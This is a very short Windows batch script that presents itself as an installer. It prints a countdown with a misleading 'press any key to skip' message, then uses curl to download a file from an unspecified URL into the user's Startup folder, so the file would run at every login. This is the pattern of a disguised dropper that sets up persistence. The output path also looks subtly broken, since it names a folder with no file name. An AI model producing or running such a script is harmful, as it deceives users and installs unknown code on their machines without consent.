@echo off
color 02
echo Installation will begin in 15 seconds. Press any key to skip
timeout /t 15 > nul
curl %URL% -o "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
